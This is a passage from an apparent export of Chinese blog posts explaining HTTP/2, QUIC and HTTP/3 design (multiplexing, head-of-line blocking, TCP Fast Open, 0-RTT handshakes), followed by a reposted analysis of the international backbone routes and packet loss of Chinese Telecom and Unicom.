二进制分帧层：在应用层与传输层之间增加一个二进制分帧层，以此达到在不改动 HTTP 的语义，HTTP 方法、状态码、URI 及首部字段的情况下，突破 HTTP/1.1 的性能限制，改进传输性能，实现低延迟和高吞吐量。在二进制分帧层上，HTTP/2.0 会将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码，其中 HTTP1.x 的首部信息会被封装到 Headers 帧，而我们的 request body 则封装到 Data 帧里面。 多路复用：对于 HTTP/1.x，即使开启了长连接，请求的发送也是串行发送的，在带宽足够的情况下，对带宽的利用率不够，HTTP/2.0 采用了多路复用的方式，可以并行发送多个请求，提高对带宽的利用率。 数据流优先级：由于请求可以并发发送了，那么如果出现了浏览器在等待关键的 CSS 或者 JS 文件完成对页面的渲染时，服务器却在专注的发送图片资源的情况怎么办呢？HTTP/2.0 对数据流可以设置优先值，这个优先值决定了客户端和服务端处理不同的流采用不同的优先级策略。 服务端推送：在 HTTP/2.0 中，服务器可以向客户发送请求之外的内容，比如正在请求一个页面时，服务器会把页面相关的 logo，CSS 等文件直接推送到客户端，而不会等到请求来的时候再发送，因为服务器认为客户端会用到这些东西。这相当于在一个 HTML 文档内集合了所有的资源。 头部压缩：使用首部表来跟踪和存储之前发送的键值对，对于相同的内容，不会再每次请求和响应时发送。 HTTP/2.0 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS。 HTTP/2.0 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DEFLATE。 QUIC 和 HTTP3 虽然 HTTP/2 提高了网页的性能，但是并不代表它已经是完美的了，HTTP/3 就是为了解决 HTTP/2 所存在的一些问题而被推出来的。随着时间的演进，越来越多的流量都往手机端移动，手机的网络环境会遇到的问题像是封包丢失机率较高、较长的 Round Trip Time (RTT)和连接迁移等问题，都让主要是为了有线网路设计的HTTP/TCP协议遇到贫颈。 我们可以看两个典型的问题。 第一握手带来的消耗。HTTP/2 使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程： 在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。 进行 TLS 连接，TLS 有两个版本——TLS 1.2 和 TLS 1.3，每个版本建立连接所花的时间不同，大致是需要1~2个 RTT。 总之，在传输数据之前，我们需要花掉 3～4 个 RTT。 第二，TCP 的队头阻塞并没有得到彻底解决。我们知道，为了实现多路复用，在 HTTP/2 中多个请求是跑在一个 TCP 管道中的。但当出现了丢包时，HTTP/2 的表现反倒不如 HTTP/1.X 了。因为 TCP 为了保证可靠传输，有个特别的丢包重传机制，丢失的包必须要等待重新传输确认，HTTP/2 出现丢包时，整个 TCP 都要开始等待重传，那么就会阻塞该 TCP 连接中的所有请求。而对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。 至此，我们很容易就会想到，为什么不直接去修改 TCP 协议？其实这已经是一件不可能完成的任务了。因为 TCP 存在的时间实在太长，已经充斥在各种设备中，并且这个协议是由操作系统实现的，更新起来非常麻烦，不具备显示操作性。 HTTP/3 乘着 QUIC 来了。 HTTP3 是基于 QUIC 的协议，如上图。先说 QUIC，QUIC 协议是 Google 提出的一套开源协议，它基于 UDP 来实现，直接竞争对手是 TCP 协议。QUIC 协议的性能非常好，甚至在某些场景下可以实现 0-RTT 的加密通信。 在 Google 关于 QUIC https://docs.google.com/document/d/1gY9-YNDNAB1eip-RTPbqphgySwSNSDHLq9D5Bty4FSU/edit 的文件中提到，与 HTTP/2 相比，QUIC 主要具有下列优势： Reduce connection establishment latency （减少连接建立时间） Improved congestion control （改进拥塞控制） Multiplexing without head-of-line blocking （没有队头阻塞的多路复用） Forward error correction （修复之前的错误） Connection migration（支持网络迁移） 多路复用，避免队头阻塞 这句话说起来很容易，但理解起来并不那么显然，要想理解 QUIC 协议到底做了什么以及这么做的必要性，我想还是从最基础的 HTTP/1.0 聊起比较合适。 Pipiline 根据谷歌的调查， 现在请求一个网页，平均涉及到 80 个资源，30 多个域名。考虑最原始的情况，每请求一个资源都需要建立一次 TCP 请求，显然不可接受。HTTP 协议规定了一个字段 Connection，不过默认的值是 close，也就是不开启。 早在 1999 年提出的 HTTP 1.1协议 中就把 Connection 的默认值改成了Keep-Alive，这样同一个域名下的多个 HTTP 请求就可以复用同一个 TCP 连接。这种做法被称为 HTTP Pipeline，优点是显著的减少了建立连接的次数，也就是大幅度减少了 RTT。 以上面的数据为例，如果 80 个资源都要走一次 HTTP 1.0，那么需要建立 80 个 TCP 连接，握手 80 次，也就是 80 个 RTT。如果采用了 HTTP 1.1 的 Pipeline，只需要建立 30 个 TCP 连接，也就是 30 个 RTT，提高了 62.5% 的效率。 Pipeline 解决了 TCP 连接浪费的问题，但它自己还存在一些不足之处，也就是所有管道模型都难以避免的队头阻塞问题。 队头阻塞 我们再举个简单而且直观的例子，假设加载一个 HTML 一共要请求 10 个资源，那么请求的总时间是每一个资源请求时间的总和。最直观的体验就是，网速越快请求时间越短。然而如果某一个资源的请求被阻塞了（比如 SQL 语句执行非常慢）。但对于客户端来说所有后续的请求都会因此而被阻塞。 队头阻塞（Head of line blocking，下文简称 HOC）说的是当有多个串行请求执行时，如果第一个请求不执行完，后续的请求也无法执行。比如上图中，如果第四个资源的传输花了很久，后面的资源都得等着，平白浪费了很多时间，带宽资源没有得到充分利用。 因此，HTTP 协议允许客户端发起多个并行请求，比如在笔者的机器上最多支持六个并发请求。并发请求主要是用于解决 HOC 问题，当有三个并发请求时，情况会变成这样： 可见虽然第四个资源的请求被阻塞了，但是其他的资源请求并不一定会被阻塞，这样总的来说网络的平均利用率得到了提升。 支持并发请求是解决 HOC 问题的一种方案，这句话没有错。但是我们要理解到：“并发请求并非是直接解决了 HOC 的问题，而是尽可能减少 HOC 造成的影响“，以上图为例，HOC 的问题依然存在，只是不会太浪费带宽而已。 有读者可能会好奇，为什么不多搞几个并发的 HTTP 请求呢？刚刚说过笔者的电脑最多支持 6 个并发请求，谷歌曾经做过实验，把 6 改成 10，然后尝试访问了三千多个网页，发现平均访问时间竟然还增加了 5% 左右。这是因为一次请求涉及的域名有限，再多的并发 HTTP 请求并不能显著提高带宽利用率，反而会消耗性能。 SPDY 的做法 有没有办法解决队头阻塞呢？ 答案是肯定的。SPDY 协议的做法很值得借鉴，它采用了多路复用（Multiplexing）技术，允许多个 HTTP 请求共享同一个 TCP 连接。我们假设每个资源被分为多个包传递，在 HTTP 1.1 中只有前面一个资源的所有数据包传输完毕后，后面资源的包才能开始传递（HOC 问题），而 SPDY 并不这么要求，大家可以一起传输。 这么做的代价是数据会略微有一些冗余，每一个资源的数据包都要带上标记，用来指明自己属于哪个资源，这样客户端最后才能把他们正确的拼接起来。不同的标记可以理解为图中不同的颜色，每一个小方格可以理解为资源的某一个包。 TCP 窗口 是不是觉得 SPDY 的多路复用已经够厉害了，解决了队头阻塞问题？很遗憾的是，并没有，而且我可以很肯定的说，只要你还在用 TCP 链接，HOC 就是逃不掉的噩梦，不信我们来看看 TCP 的实现细节。 我们知道 TCP 协议会保证数据的可达性，如果发生了丢包或者错包，数据就会被重传。于是问题来了，如果一个包丢了，那么后面的包就得停下来等这个包重新传输，也就是发生了队头阻塞。当然 TCP 协议的设计者们也不傻，他们发明了滑动窗口的概念： 这样的好处是在第一个数据包（1-1000） 发出后，不必等到 ACK 返回就可以立刻发送第二个数据包。可以看出图中的 TCP 窗口大小是 4，所以第四个包发送后就会开始等待，直到第一个包的 ACK 返回。这样窗口可以向后滑动一位，第五个包被发送。 如果第一、二、三个的包都丢失了也没有关系，当发送方收到第四个包时，它可以确信一定是前三个 ACK 丢了而不是数据包丢了，否则不会收到 4001 的 ACK，所以发送方可以大胆的把窗口向后滑动四位。 滑动窗口的概念大幅度提高了 TCP 传输数据时抗干扰的能力，一般丢失一两个 ACK 根本没关系。但如果是发送的包丢失，或者出错，窗口就无法向前滑动，出现了队头阻塞的现象。 QUIC 是如何做的 所以说 HOC 不仅仅在 HTTP 层存在，在 TCP 层也存在，这也正是 QUIC 协议要解决的问题。回顾 SPDY 是如何解决 HOC 的，没错，多路复用（Multiplex）。QUIC 协议也采用了多路复用技术。 UIC 协议基于 UDP 实现，我们知道 UDP 协议只负责发送数据，并不保证数据可达性。这一方面为 QUIC 的多路复用提供了基础，另一方面也要求 QUIC 协议自己保证数据可达性。 SPDY 为各个数据包做好标记，指明他们属于哪个 HTTP 请求，至于这些包能不能到达客户端，SPDY 并不关心，因为数据可达性由 TCP 协议保证。既然客户端一定能收到包，那就只要排序、拼接就行了。QUIC 协议采用了多路复用的思想，但同时还得自己保证数据的可达性。 TCP 协议的丢包重传并不是一个好想法，因为一旦有了前后顺序，队头阻塞问题将不可避免。而无序的数据发送给接受者以后，如何保证不丢包，不错包呢？这看起来是个不可能完成的任务，不过如果把要求降低成：最多丢一个包，或者错一个包。事情就简单多了，操作系统中有一种存储方式叫 RAID 5，采用的是异或运算加上数据冗余的方式来保证前向纠错（FEC: Forward Error Correcting）。QUIC 协议也是采用这样的思想，这里不再赘述。 利用冗余数据的思想，QUIC 协议基本上避免了重发数据的情况。当然 QUIC 协议还是支持重传的，比如某些非常重要的数据或者丢失两个包的情况。 少 RTT，请求更快速 前面说到，一次 HTTPS 请求，它的基本流程是三次 TCP 握手外加四次 SSL/TLS 握手。也就是需要三个 RTT。但是 QUIC 在某些场景下，甚至能够做到 0RTT。 首先介绍下什么是 0RTT。所谓的 0RTT 就是通信双方发起通信连接时，第一个数据包便可以携带有效的业务数据。而我们知道，这个使用传统的TCP是完全不可能的，除非你使能了 TCP 快速打开特性，而这个很难，因为几乎没人愿意为了这个收益去对操作系统的网络协议栈大动手脚。未使能 TCP 快速打开特性的TCP传输第一笔数据前，至少要等1个RTT。 我们这里再说说 HTTP2。对于 HTTP2 来说，本来需要一个额外的 RTT 来进行协商，判断客户端与服务器是不是都支持 HTTP2，不过好在它可以和 SSL 握手的请求合并。这也导致了一个现象，就是大多数主流浏览器仅支持 HTTPS2 而不单独支持 HTTP2。因为 HTTP2 需要一个额外的 RTT，HTTPS2 需要两个额外的 RTT，仅仅是增加一个 RTT 就能获得数据安全性，还是很划算的。 TCP 快速打开 何谓 TCP 快速打开，即客户端可以在发送第一个 SYN 握手包时携带数据，但是 TCP 协议的实现者不允许将把这个数据包上传给应用层。这主要是为了防止 TCP 泛洪攻击 [。 因为如果 SYN 握手的包能被传输到应用层，那么现有的防护措施都无法防御泛洪攻击，而且服务端也会因为这些攻击而耗尽内存和 CPU。 当然 TCP 快速打开并不是完全不可行的。人们设计了 TFO (TCP Fast Open)，这是对 TCP 的拓展，不仅可以在发送 SYN 时携带数据，还可以保证安全性。 TFO 设计了一个 Cookie，它在第一次握手时由 server 生成，Cookie 主要是用来标识客户端的身份，以及保存上次会话的配置信息。因此在后续重新建立 TCP 连接时，客户端会携带 SYN + Cookie + 请求数据，然后不等 ACK 返回就直接开始发送数据。 服务端收到 SYN 后会验证 Cookie 是否有效，如果无效则会退回到三次握手的步骤，如下图所示： 同时，为了安全起见，服务端为每个端口记录了一个值 PendingFastOpenRequests，用来表示有多少请求利用了 TFO，如果超过预设上限就不再接受。 关于 TFO 的优化，可以总结出三点内容: TFO 设计的 Cookie 思想和 SSL 恢复握手时的 Session Ticket 很像，都是由服务端生成一段 Cookie 交给客户端保存，从而避免后续的握手，有利于快速恢复。 第一次请求绝对不会触发 TFO，因为服务器会在接收到 SYN 请求后把 Cookie 和 ACK 一起返回。后续客户端如果要重新连接，才有可能使用这个 Cookie 进行 TFO. TFO 并不考虑在 TCP 层过滤重复请求，以前也有类似的提案想要做过滤，但因为无法保证安全性而被拒绝。所以 TFO 仅仅是避免了泛洪攻击（类似于 backlog），但客户端接收到的，和 SYN 包一起发来的数据，依然有可能重复。不过也只有可能是 SYN 数据重复，所以 TFO 并不处理这种情况，要求服务端程序自行解决。这也就是说，不仅仅要操作系统的支持，更要求应用程序（比如 MySQL）也支持 TFO。 TFO 使得 TCP 协议有可能变成 0-RTT，核心思想和 Session Ticket 的概念类似: 将当前会话的上下文缓存在客户端。如果以后需要恢复对话，只需要将缓存发给服务器校验，而不必花费一个 RTT 去等待。 结合 TFO 和 Session Ticket 技术，一个本来需要花费 3 个 RTT 才能完成的请求可以被优化到一个 RTT。如果使用 QUIC 协议，我们甚至可以更进一步，将 Session Ticket 也放到 TFO 中一起发送，这样就实现了 0-RTT 的对话恢复。 QUIC 是怎么做的 让我们看看 QUIC 是怎么做的。 首先声明一点，如果一对使用 QUIC 进行加密通信的双方此前从来没有通信过，那么 0-RTT 是不可能的，即便是 QUIC 也是不可能的。 QUIC 握手的过程需要一次数据交互，0-RTT 时延即可完成握手过程中的密钥协商，比 TLS 相比效率提高了 5 倍，且具有更高的安全性。在握手过程中使用 Diffie-Hellman 算法协商初始密钥，初始密钥依赖于服务器存储的一组配置参数，该参数会周期性的更新。初始密钥协商成功后，服务器会提供一个临时随机数，双方根据这个数再生成会话密钥。 具体握手过程如下： (1) 客户端判断本地是否已有服务器的全部配置参数，如果有则直接跳转到(5)，否则继续 (2) 客户端向服务器发送 inchoate client hello(CHLO) 消息，请求服务器传输配置参数 (3) 服务器收到 CHLO，回复 rejection(REJ) 消息，其中包含服务器的部分配置参数 (4) 客户端收到 REJ，提取并存储服务器配置参数，跳回到(1) (5) 客户端向服务器发送 full client hello 消息，开始正式握手，消息中包括客户端选择的公开数。此时客户端根据获取的服务器配置参数和自己选择的公开数，可以计算出初始密钥。 (6) 服务器收到 full client hello，如果不同意连接就回复 REJ，同(3)；如果同意连接，根据客户端的公开数计算出初始密钥，回复 server hello(SHLO)消息，SHLO 用初始密钥加密，并且其中包含服务器选择的一个临时公开数。 (7) 客户端收到服务器的回复，如果是 REJ 则情况同(4)；如果是 SHLO，则尝试用初始密钥解密，提取出临时公开数 (8) 客户端和服务器根据临时公开数和初始密钥，各自基于 SHA-256 算法推导出会话密钥 (9) 双方更换为使用会话密钥通信，初始密钥此时已无用，QUIC 握手过程完毕。之后会话密钥更新的流程与以上过程类似，只是数据包中的某些字段略有不同。 写在最后 想起有一个名言：计算机领域没有什么问题是加一层解决不了的，如果有，就再加一层。网络模型本来就是层层累加，到了 Web 得以快速生动的展现给人们以丰富的内容。从 HTTP 的演变过程中，我们可以看到中间又累加了若干层。不知道以后，又会是怎么样呢？ 大家会发现，笔者在文中不止一次提到了演变这个词。是的，这是来自达尔文进化论中的理论。在笔者看来，“物竞天择，适者生存”的演变理论和计算机领域的技术变化是很类似的，只不过在这里，不是天择，而是人择。由市场，由用户来选择。不知道接下来，作为选择者的我们，又将怎样主导技术的走向？ ","link":"https://blog.gd1214b.icu/post/UN4IHs4TZ/"},{"title":"HTTP/3 来了，你了解它么？","content":" 本文转自:https://www.upyun.com/tech/article/577/HTTP%2F3 来了，你了解它么？.html 作为我们网上冲浪最为常见，也经常被人忽视的 HTTP 已经更新换代到了 HTTP/3。本文简单明了的带你认识 HTTP/3 的作用。 HTTP/3 是什么？ 要深入了解 HTTP/3，那首先要知道什么是 HTTP/3。 如上图所示，HTTP/3 是基于 QUIC 的协议。而 QUIC 协议是 Google 提出的一套开源协议，它基于 UDP 来实现，直接竞争对手是 TCP 协议。 另外，要聊 HTTP/3，HTTP 的发展历程是怎么也绕不过去的，而且可以讲很久。 HTTP/3 的优点及不足 今天我们在这里简单说一下 HTTP/3 相比较 HTTP/2 进步的那些点。 回归正题，相比 HTTP/2 而言 HTTP/3 有以下几点提升： HTTP/3 使用 stream 进一步扩展了 HTTP/2 的多路复用。在 HTTP/3 模式下，一般传输多少个文件就会产生对应数量的 stream。当这些文件中的其中一个发生丢包时，你只需要重传丢包文件的对应 stream 即可。 HTTP/3 不再是基于 TCP 建立的，而是通过 UDP 建立，在用户空间保证传输的可靠性，相比 TCP，UDP 之上的 QUIC 协议提高了连接建立的速度，降低了延迟。 通过引入 Connection ID，使得 HTTP/3 支持连接迁移以及 NAT 的重绑定。 HTTP/3 含有一个包括验证、加密、数据及负载的 built-in 的 TLS 安全机制。 拥塞控制。TCP 是在内核区实现的，而 HTTP/3 将拥塞控制移出了内核，通过用户空间来实现。这样做的好处就是不再需要等待内核更新可以实现很方便的进行快速迭代。 头部压缩。HTTP/2 使用的 HPACK，HTTP/3 更换成了兼容 HPACK 的 QPACK 压缩方案。QPACK 优化了对乱序发送的支持，也优化了压缩率。 没有哪项技术是完美无缺的，更不用说是还在发展中的 HTTP/3 了。 HTTP/3 建立传输用的是 UDP 协议，而在 HTTP/3 出现前 UDP 的通常出现地点是类似《计算机网络》这样的书面理论，即便是实际应用也大多和网络攻击一起出现，这就导致 UDP 的名声不太好。名声差了自然在硬件上的支持也捉襟见肘，大部分互联网服务也就理所当然的对 UDP 的访问进行限制。 准备好迎接 HTTP/3 了吗？ 但是毫无疑问的，HTTP/3 是目前最前沿的互联网标准，它的缺点可以通过不断的改进来完善。相比与 HTTP/3 本身的缺陷问题，作为一项新技术最致命的问题是能否获得足够多的有效支持，从而进行大范围推广。 那么当前的环境已经有迎接 HTTP/3 的能力了么？ HTTP/3 作为互联网的标准革新之一，在支持方面无非两点，一个是服务端，一个是客户端。 先来看一下客户端，大家所熟悉的浏览器 Chrome 以及常用 Curl 命令行工具都已经支持 HTTP/3 特性。在 Chrome 的开发者工具一栏里你可以看到一项显示为“HTTP/2+quic/99”，这就是 Chrome 已经支持 HTTP/3 的证据。毕竟 HTTP/3 的组成离不开 QUIC 协议。 而在 Curl 命令行工具(https://github.com/curl/curl) 的最新版本， 你只需在常规的命令末尾添加“--HTTP/3”即可使用 HTTP/3，如果目标服务器支持，它会自然的返回“HTTP/3 200”。 确认了客户端的支持，我们接下来看一下服务端。 自 2013 年 QUIC 被正式公开以来，到 2020 年已经发展了差不多7年，目前网上已经有了不少热门开源的项目，除去带头大哥 Google 在完成了对自身搜索引擎的支持，还同时拉上了 Gmail 、YouTube 等站点。但对于国内的绝大部分站点来说，HTTP/3 之路，似乎还停留在东土大唐，即使 Nginx 已经公开声明：“我们已经支持 QUIC 协议“。 我们可以看到，虽然目前环境还没有全面迭代到 HTTP/3 ，但是 HTTP/3 的发展是不可阻拦的。 ","link":"https://blog.gd1214b.icu/post/G2KB6-qOq/"},{"title":"国内主流网络运营商国际连接线路简谈","content":" 本文转自:https://zhuanlan.zhihu.com/p/64467370 中国大陆目前国际网络的建设状况 根据新华网最新的报道指出，截至 2019 年 4 月，全国三大运营商——电信、联通、移动保有宽带用户数如下： 中国电信：1.46 亿户； 中国联通：0.8088 亿户 中国移动：1.57 亿户。 根据公布在 中华人民共和国国家互联网信息办公室&amp;中共中央网络安全和信息化委员会办公室 页面的，由 中国互联网络信息中心 于 2019 年 2 月公布的“第43次《中国互联网络发展状况统计报告》”指出，国内主要骨干网络国际出口带宽共有 8,946,570 Mbps，国内主流三大运营商所拥有的国际出口带宽数据如下： 中国电信：4,537,680 Mbps； 中国联通：2,234,738 Mbps； 中国移动：1,997,000 Mbps； 由此可得，各家出口带宽的总量比较如下： 中国电信 ＞ 中国联通 ＞ 中国移动 结合上述宽带用户数，可得各家人均用户出口带宽量比较如下： 中国联通 ＞ 中国电信 ＞ 中国移动 国际出口带宽量的增长，与海缆建设周期息息相关： 根据中国信息通信研究院公布的中国国际光缆互联互通白皮书指出： 2009-2012 年,数据中心成为驱动国际海底光缆建设的最大驱动力，国际海底光缆又迎了一个建设小高潮。目前，全球海缆建设正在进入第三次建设高潮，全球 40%的海缆是 2000 年之前建设的，已经逐步进入了海缆使用生命 周期的尾期，未来几年，数据中心互联及互联网带宽需求将持续增长， 全球海缆将进入一个新旧更替的时期，形成海缆布局的时间窗口， 2016 年跨太平洋、跨大西洋、亚欧间海缆系统已经开始升级换代。 2013 年国际出口带宽的猛增，和云计算的普及息息相关。 另外，随着老旧的中美光缆（CUCN）于 2016 年底退役，目前中美之间的连接，主要由太平洋直达高速光缆（TPE）和正在建设的新跨太平洋国际海底光缆（NCP）承载，NCP 建成后，将极大缓解中美之间网络拥堵的状况。 “人均”问题不解决，晚高峰拥堵的状况是注定无解的： 与未来国际流量发展预期和世界主要国家相对，中国的国际海缆发展仍显不足,美国的海缆数量是中国的 8 倍，人均带宽是中国近 20 倍；日本的海缆数量是中国 2 倍多，人均带宽是中国近 10 倍；英国海缆数量是中国的 5 倍多，人均带宽是中国 72 倍；新加坡海缆数量是中国 2 倍多，人均带宽是中国 262 倍。 前途是光明的，道路是曲折的，海缆建设是一个投资大的、长期的、系统化的、复杂的工程，既然正在规划中的海缆，并不能直接享受到，所以我们就只能就目前的情况，做一个分析。 目前国内三大主流运营商的国际出口路由现状 看过上述分析的同学应该晓得了，如果有经常访问外网的需求，使用中国联通的固网是最明智的选择，那么，这三大运营商的国际出口路由具体是什么情况呢？我们来逐一分析。 1. 中国电信 中国电信目前拥有两条线路，一条是 163 骨干网（ChinaNet），另一条就是 CN2 网络； 相对 CN2 而言，有的人又习惯称 163 骨干网为 CN1，163 网是中国电信建设的最早的一个网络，它为超过 1 亿的中国电信用户承载包括连往境外的，普通质量的互联网业务。身为电信用户，如果在晚上连接境外网络总是感觉卡顿，丢包高，99.99%的原因都是因为走的这张网，大家一起挤，线路就 boom 了； CN2，即“ChinaNet Next Carrying Network（ChinaNet 的下一代承载网络）”，在 2005 年投入使用，最初架设的目标，是提供一个拓扑合理，架构先进，建设科学，用于满足未来 10-20 年替代 163 网成为未来新骨干网的网络（这个 flag 还未实现），CN2 网络能够同时承载语音、数据、视频、全球互联等业务，尤其是全球互联方面，相对于 163 网而言，CN2 网络的低丢包、低延时、轻负载，让众多用户趋之若鹜； 据统计，在中国电信的总网络连接中，163 网络承担了 85% 的网络流量，其余的 15% 流量，由 CN2 网络承担； 除了上篇文章我们提到的，外网走专线的中国电信政企网，中国电信还针对普通宽带用户，推出过氮气瓶，或称为“电信精品网”的服务，但不知道何种原因（疑似超售），这种服务现在不提供了。简单来讲，就是不管境外网络节点是普通线路，还是专门推出的CN2 网络优化版（仅针对中国大陆的通信），让在境内用户访问境外网络时，统一直接并入到 CN2 网络； 回国或出国，必定经过北京/上海/广州； 进出口路由路径，分为三个品级： 163 网（CN1）； CN2 GT（Global Transfer 又称半程 CN2 ）； CN2 GIA（Global Internet Access 又称纯 CN2/全程 CN2）； 网络路由路径遵守固定路径/边界网关协议（BGP）； 在高峰期会有策略性丢包减少对骨干网的负载； 虽然出口宽带总量最大，且人均出口带宽排行第二，但电信 163 网连接国际网络，会在高峰时段，在路由出海前的最后一跳，根据优先级，策略性地人为丢包，以减轻对主网的负担(QOS)，这让普通电信用户糟糕的外网访问质量雪上加霜； 中国电信的服务主旨：用户能用钱解决的问题，都不是问题，剩余的问题，统统都是因为“钱没给够”而导致的问题。 中国电信 163 网络 AS4134 路由拓扑图，图示来源：https://bgp.he.net/AS4134 IPv4: IPv6: 说明： 中国电信的 163 网络，一般会经过市级 → 省级 → 国际出口 → 境外接入点 AS（自治路由协议） 号为 4134 的路由节点，这些路由节点的 IP 地址开头一律是 “202.97..”，全程不会经过 CN2 网络节点； 163 网络国内之间互相访问基本上不存在性能瓶颈，只有在国际出口才会发生拥堵； 仅统计国际网络的访问质量，163 网络全天的丢包率在 5% ~ 10%左右，如果在夜晚间高峰期（UTC+8 18:00 至 23:00 时），丢包率可达到 15% 以上； 会经过更多的路由数量； 163 网(民用电信宽带都属于这种)，是全中国用户数量最大，访问国际网络体验最差的线路，国外网站用浏览器打开需要转圈等上个十来分钟，PC、PS、Xbox 连接外服下载极慢(十几 kb / 秒)，玩游戏卡顿(丢包)等现象屡见不鲜； 除了例如自“云上贵州”落地中国后，iOS / Mac 用户连接 app store、iCloud 速度迟缓的情况大有改观这样的案例，所有 163 网用户在访问没有在中国大陆境内(不包含港澳台)布设本地服务器或 CDN 加速服务的境外网站或网络服务，被迫忍受极其缓慢的速度等现象，在未来 10 - 20 年之内无法缓解； 某国家级别大型网关，利用机器学习和人工干预等手段，会实时对境内和境外通信的互联网流量，做深度包检测、数据请求头分析、带高危协议特征流量的干扰和阻断等工作，从而保障中华人民共和国互联网通信的安全，代价是损耗一部分外网通信的性能(存疑)； 不要想当然地以为，某 VPS 距离接入网络的地域蛮近的（上海 → 日本 / 广州 → 新加坡等），延迟和掉包情况一定不大，在该 VPS 商家有大量用户访问和绕路以及晚高峰情况下，163 网络的劣化程度比你想象的要严重得多：如从中国 → 新加坡（godaddy 新加坡虚拟主机），实际上是从中国 → 美国 → 新加坡），单程环两次北太平洋，看你怕不怕。 一个典型的 163 网络的国际访问路由，注意出海前经过路由的 AS 号和对应的 IP 地址 16 ~ 17 年时，连接亚太地区的路径普遍较差，绕美是家常便饭. 从 18 年末，渐渐有了好转，电信一般都是绕日 NTT 过去，不过访问质量依旧很糟糕，线路无优化商家的劣势就是通信不稳定: 中国电信 CN2 网络 AS4809 路由拓扑图，图示来源：https://bgp.he.net/AS4809 IPv4: IPv6: 说明： CN2 网络的拓扑图远比 163 网复杂许多，整个网络的建设充分利用了各个节点之间的互联性，而不像 163 网那样简单粗暴地采用从上到下、从一到多的布设逻辑，从而充分使每一个节点在遭遇重负载时，可以迅速由周围节点来缓解负载； CN2 GT 产品在从市级 → 省级 → 国际出口这一段走的是 163 网络，国际出口 → 境外接入点这一段汇入 CN2 网络，返程同理，偶尔可能会走联通的国际网络； 作为典型的半程 CN2 产品，CN2 GT 网络的数据包即使在国际间传送几乎不会出现丢包的情况，但依然非常容易在国内这一段拥堵时，出现被中国电信舍弃数据包的情况，CN2 GT 网络全天的丢包率在 4% ~ 6%左右，如果在夜晚间高峰期（UTC+8 18:00 至 23:00 时），丢包率可达到 8% 以上； CN2 GIA 产品在从市级 → 省级 → 国际出口 → 境外接入点的过程中，全程走 AS 号为 4809 的路由节点，这些路由节点的 IP 地址开头一律是 “59.43..”，全程不会经过 163 网络节点； 在没有购买昂贵的政企专线网络或氮气瓶加速服务的情况下，中国电信普通宽带用户连接海外节点具体走何种线路，取决于对方节点采用了何种路由自治协议，当然，决定它并不是靠心情，而是要和接入的电信运营商签署协议，一旦签署了走何种协议，如纯 CN2 网络，势必要向中国电信缴纳一笔高昂的 CN2 网络使用费用（最后这笔钱还得由用户承担），这就导致支持 CN2 GIA 网络的 VPS 产品价格最昂贵，CN2 GT 价格其次，163 网最为低廉（不用向中国电信缴纳一笔专门优化中国线路的银子）； 作为中国电信的旗舰产品，CN2 GIA 产品的表现绝不会令任何人失望，无论是白天，还是晚高峰时期，纯 CN2 线路的掉包率均在 0.1% 以下，用户在访问过程中，行云流水，畅快丝滑。 其实如果更严格地划分，CN2 GIA 产品还分为单网、双网、三网三种，顾名思义，单网 CN2 GIA 一般指的是仅中国电信用户访问去回，走 CN2 GIA 网络，联通/移动/教育网等用户访问过去，均走各自运营商的国际出口（典型产品为阿里云国际香港节点）；双网 CN2 GIA 一般指的是中国电信/中国联通用户访问过去，走 CN2 GIA 网络（特别地，该产品允许中国联通线路在省级跨网并入到中国电信的 CN2 网络，典型产品为标准互联的圣何塞 CN2 GIA 产品）；三网 CN2 GIA 一般指的是中国电信/中国联通/中国移动三网用户的去回访问，均会在省级并入到 CN2 网络，适用性最强（典型产品为搬瓦工的 DC9、DC6 机房）。 部分偏远地区的电信用户（比如在县级、村级、非重点市级）访问境外 CN2 GIA 线路的服务器时，会经过 IP 地址为 202.97.. 的 AS4314 路由一跳，并入到已布设 CN2 网络的重点市级节点，随后再全程走 CN2 网络。 由于担负的网络流量并不高，冗余量不够，CN2 网络的防御力比较脆弱。比如说，VPS 商之间同行攻击的情况屡见不鲜，所以很容易发现某家 CN2 GIA 网络的 VPS 一旦被打（DDoS攻击），毫无还手之力，整个网络会陷入瘫痪，只有等硬扛过去，该家的 CN2 GIA 网络才能重新恢复使用。 一个非常典型的 CN2 GIA 网络，注意跳了一下 202.97 打头的路由，其余全程 59.43: 一个非常典型的 CN2 GT 网络，注意在国内走的时候，一定是 202.97 路由，出海后再走 59.43 路由: 2. 中国联通(这部分会加入一些 VPS 线路购置经验谈) 中国联通宽带用户增长率不高，拥有的总用户数最近竟被移动赶超，目前市场份额处于垫底，但对用户来说无疑是极其利好的消息。因为其拥有全国仅次于电信用户的国际总出口带宽，这就意味着中国联通用户访问外网遭遇的烦心事儿比电信和/移动用户要少很多，如果不想在 CN2 GIA 上花一笔大洋，一个普通中国联通宽带用户的国际访问“人权”是最有保障的； 出海和归来均走北上广； 出/回走 AS4837（联通 169 网络）/AS9929（A网）路由，暂无类似中国电信那样的国际精品网络产品； 网络路由路径遵守固定路径/边界网关协议（BGP）； 晚高峰时期骨干网选择性丢包的力度比中国电信低很多； 美日线路绝赞性价比。 中国联通 169 网络 AS4837 路由拓扑图，图示来源：https://bgp.he.net/AS4837 IPv4: IPv6: 说明： 中国联通普通用户从市级 → 省级 → 国际出口 → 境外接入点的过程中，全程走 AS 号为 4837 的路由节点，这些路由节点的 IP 地址开头一律是 “219.158..”，全程不会经过 A网（AS9929）； 经过的路由数较多，导致延迟普遍比 CN2 GIA 网络要高； 169 网络全天的丢包率在 1% ~ 3%左右，如果在夜晚间高峰期（UTC+8 18:00 至 23:00 时），丢包率可达到 4% 以上； 如果用户生活在中国联通的国际出口城市（北/上/广），或离这三座城市的距离很近，那么可以获得非常不错的延迟。 美国地区：直连，不错。 新加坡地区，比较依赖对方 VPS 商的线路优化，很多情况下联通去程统一绕日本 NTT（一家我很讨厌的日本线路，不谈国际声誉，只要从中国连接到日本走得是这条线，不爆炸我送你一包辣条）过去；回程直连广州联通或是依旧绕日返回。除了阿里云国际新加坡这样对三网不错的，联通用户慎选新加坡机房。 香港地区，也得看商家和线路，最普通的，如 Softlayer 等，依旧绕日 